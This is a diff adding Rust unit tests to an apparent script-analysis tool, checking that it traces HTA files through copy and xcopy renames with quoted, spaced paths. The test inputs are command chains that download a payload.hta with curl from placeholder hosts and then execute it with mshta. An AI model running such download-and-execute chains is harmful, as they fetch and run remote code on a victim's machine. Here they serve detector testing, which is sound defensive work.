@@ -18112,6 +18112,28 @@ mshta renamed.hta"#,
     }
 
     #[test]
+    fn copy_preserves_download_source_for_quoted_paths_with_spaces() {
+        let report = crate::analyze(
+            br#"curl -o "original payload.hta" https://copy-space-download.example/payload.hta
+copy "original payload.hta" "renamed payload.hta"
+mshta "renamed payload.hta""#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta \"renamed payload.hta\""
+                            && url == "https://copy-space-download.example/payload.hta"
+                )
+            }),
+            "quoted copy HTA with spaces was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn single_source_file_ops_preserve_tracked_content() {
         for command in [
             "copy original.vbs renamed.vbs",
@@ -18182,6 +18204,28 @@ mshta "renamed.hta""#,
                 )
             }),
             "quoted xcopy HTA was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn xcopy_preserves_download_source_for_quoted_paths_with_spaces() {
+        let report = crate::analyze(
+            br#"curl -o "original payload.hta" https://xcopy-space-download.example/payload.hta
+xcopy /y "original payload.hta" "renamed payload.hta"
+mshta "renamed payload.hta""#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta \"renamed payload.hta\""
+                            && url == "https://xcopy-space-download.example/payload.hta"
+                )
+            }),
+            "quoted xcopy HTA with spaces was not linked on later execution: {:?}",
             report.traits
         );
     }
